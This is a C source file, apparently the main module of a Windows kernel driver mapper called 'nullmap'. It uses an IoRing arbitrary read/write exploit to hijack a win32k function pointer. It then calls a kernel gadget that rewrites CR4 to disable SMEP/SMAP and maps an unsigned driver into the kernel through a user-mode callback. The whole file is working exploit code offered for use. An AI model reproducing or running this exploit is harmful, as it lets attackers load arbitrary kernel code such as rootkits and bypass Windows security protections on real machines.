#include "general.h"

BOOL CallKernelFunction(DWORD64 pointerKernelAddress, void* targetFunction, void* argument1, void* argument2)
{
	ConsoleInfo("Reading original function address...");
	DWORD64 originalAddress = 0;
	BOOL status = IoRingReadHelper(pointerKernelAddress, &originalAddress, sizeof(DWORD64));
	if (!status)
	{
		ConsoleError("Failed to read function pointer!");
		return FALSE;
	}

	ConsoleSuccess("Original function: 0x%p", originalAddress);

	ConsoleInfo("Writing new function address...");
	DWORD64 newAddress = (DWORD64)targetFunction;
	status = IoRingWriteHelper(pointerKernelAddress, &newAddress, sizeof(DWORD64));
	if (!status)
	{
		ConsoleError("Failed to write function pointer!");
		return FALSE;
	}

	ConsoleInfo("Calling hooked function...");
	HMODULE userModule = LoadLibraryA("user32.dll"); // has to be loaded otherwise win32u will shit itself
	if (!userModule)
		return FALSE;

	HMODULE targetModule = LoadLibraryA("win32u.dll");
	if (!targetModule)
		return FALSE;

	void* (*hookedFunction)(void*, void*);
	*(void**)&hookedFunction = GetProcAddress(targetModule, "NtGdiGetEmbUFI");
	if (!hookedFunction)
	{
		ConsoleError("Failed to get NtGdiGetEmbUFI!");
		return FALSE;
	}

	hookedFunction(argument1, argument2);

	ConsoleInfo("Writing back original function address...");
	status = IoRingWriteHelper(pointerKernelAddress, &originalAddress, sizeof(DWORD64));
	if (!status)
	{
		ConsoleError("Failed to write function pointer!");
		return FALSE;
	}

	return TRUE;
}

int main(int argc, char* argv[])
{
	ConsoleTitle("nullmap");

	if (argc != 2)
	{
		ConsoleError("Invalid parameters; read README in official repo (github.com/SamuelTulach/nullmap)");
		getchar();
		return -1;
	}

	ConsoleInfo("Reading driver file...");
	const char* driverFilePath = argv[1];
	SIZE_T driverFileSize;
	driverBuffer = UtilsReadFile(driverFilePath, &driverFileSize);
	if (!driverBuffer)
	{
		ConsoleError("Failed to read driver file!");
		getchar();
		return -1;
	}

	PIMAGE_NT_HEADERS64 imageHeaders = UtilsGetImageHeaders(driverBuffer, driverFileSize);
	if (!imageHeaders)
	{
		ConsoleError("Invalid image file!");
		getchar();
		return -1;
	}

	ConsoleSuccess("Driver timestamp: %llu", imageHeaders->FileHeader.TimeDateStamp);

	ConsoleInfo("Getting kernel base...");
	kernelBase = UtilsGetModuleBase("ntoskrnl.exe");
	if (!kernelBase)
	{
		ConsoleError("Could not get kernel base address!");
		getchar();
		return -1;
	}

	ConsoleSuccess("Kernel base: 0x%p", kernelBase);

	ConsoleInfo("Getting win32k.sys base...");
	PVOID win32kbase = UtilsGetModuleBase("win32k.sys");
	if (!win32kbase)
	{
		ConsoleError("Could not get win32k.sys base address!");
		getchar();
		return -1;
	}

	ConsoleSuccess("win32k.sys base: 0x%p", win32kbase);

	ConsoleInfo("Loading kernel image locally...");
	HMODULE kernelHandle = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!kernelHandle)
	{
		ConsoleError("Failed to load kernel image locally!");
		getchar();
		return -1;
	}

	ConsoleSuccess("Local base: 0x%p", kernelHandle);

	ConsoleInfo("Loading win32k.sys image locally...");
	HMODULE win32kHandle = LoadLibraryExA("win32k.sys", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!win32kHandle)
	{
		ConsoleError("Failed to load win32k.sys image locally!");
		getchar();
		return -1;
	}

	ConsoleSuccess("Local base: 0x%p", kernelHandle);

	ConsoleInfo("Resolving KeFlushCurrentTbImmediately...");
	DWORD64 gadget = (DWORD64)GetProcAddress(kernelHandle, "KeFlushCurrentTbImmediately");
	if (!gadget)
	{
		ConsoleError("Failed to load kernel image locally!");
		getchar();
		return -1;
	}

	ConsoleSuccess("KeFlushCurrentTbImmediately: 0x%p", gadget);

	ConsoleInfo("Resolving gadget address...");
	//
	// KeFlushCurrentTbImmediately + 0x17
	// mov     cr4, rcx
	// retn
	//
	gadget += 0x17;

	DWORD64 gadgetKernelAddress = (DWORD64)kernelBase + gadget - (DWORD64)kernelHandle;
	ConsoleSuccess("Gadget: 0x%p", gadgetKernelAddress);

	ConsoleInfo("Resolving jump address...");
	DWORD64 jumpScan = UtilsFindPatternImage(kernelHandle, "FF E2");
	if (!jumpScan)
	{
		ConsoleError("Failed to find jump address!");
		getchar();
		return -1;
	}

	DWORD64 jumpKernelAddress = (DWORD64)kernelBase + jumpScan - (DWORD64)kernelHandle;
	ConsoleSuccess("jmp rdx: 0x%p", jumpKernelAddress);

	ConsoleInfo("Resolving NtGdiGetEmbUFI...");
	DWORD64 pointerKernelAddress = (DWORD64)win32kbase + 0x6ff88; // .data:FFFFF97FFF06FF88DATA XREF: NtGdiGetEmbUFI
	ConsoleSuccess("NtGdiGetEmbUFI: 0x%p", pointerKernelAddress);

	ConsoleInfo("Setting up IoRing exploit...");
	PIORING_OBJECT ioRingObject = NULL;
	BOOL status = IoRingSetup(&ioRingObject);
	if (!status)
	{
		ConsoleError("Failed to setup IoRing!");
		return -1;
	}

	ConsoleSuccess("IORING_OBJECT: 0x%p", ioRingObject);

	ConsoleInfo("Writing into IoRing->RegBuffers...");
	status = ExploitWrite0x1((char*)&ioRingObject->RegBuffers + 0x3);
	if (!status)
	{
		ConsoleError("Failed to write!");
		return -1;
	}

	status = ExploitWrite0x1((char*)&ioRingObject->RegBuffersCount);
	if (!status)
	{
		ConsoleError("Failed to write!");
		return -1;
	}

	ConsoleSuccess("Write successful");

	/*CallKernelFunction(pointerKernelAddress, (VOID*)0xDEADFEEDFEED, 0x0);
	CallKernelFunction(pointerKernelAddress, (PVOID)0xDEADFEEDFEED, 0x00000000000506F8);
	IoRingRundown();
	while (TRUE) {}*/

	ConsoleInfo("Changing cr4...");
	status = CallKernelFunction(pointerKernelAddress, (PVOID)gadgetKernelAddress, 0x00000000000506F8, 0x0);
	if (!status)
	{
		ConsoleError("Failed to call function!");
		IoRingRundown();
		getchar();
		return -1;
	}

	ConsoleInfo("Calling mapper itself...");
	status = CallKernelFunction(pointerKernelAddress, (PVOID)jumpKernelAddress, 0x0, (PVOID)KernelCallback);
	if (!status)
	{
		ConsoleError("Failed to call function!");
		IoRingRundown();
		getchar();
		return -1;
	}

	ConsoleInfo("Checking kernel callback...");
	if (!kernelCallbackCalled)
	{
		ConsoleError("Callback function was not called, exploit was unsuccessful!");
		IoRingRundown();
		getchar();
		return -1;
	}

	ConsoleSuccess("Callback called");

	ConsoleInfo("Checking status...");
	if (mapStatus == STATUS_SUCCESS)
	{
		ConsoleSuccess("Driver was mapped successfully!");
		ConsoleSuccess("Driver status: 0x%p", driverStatus);
	}
	else
	{
		ConsoleError("Failed driver map: 0x%p", mapStatus);
	}

	ConsoleInfo("Restoring cr4...");
	status = CallKernelFunction(pointerKernelAddress, (PVOID)gadgetKernelAddress, 0x00000000001506F8, 0x0);
	if (!status)
	{
		ConsoleError("Failed to call function!");
		IoRingRundown();
		getchar();
		return -1;
	}

	IoRingRundown();
	ConsoleSuccess("Everything successful");
	getchar();
	return 0;
}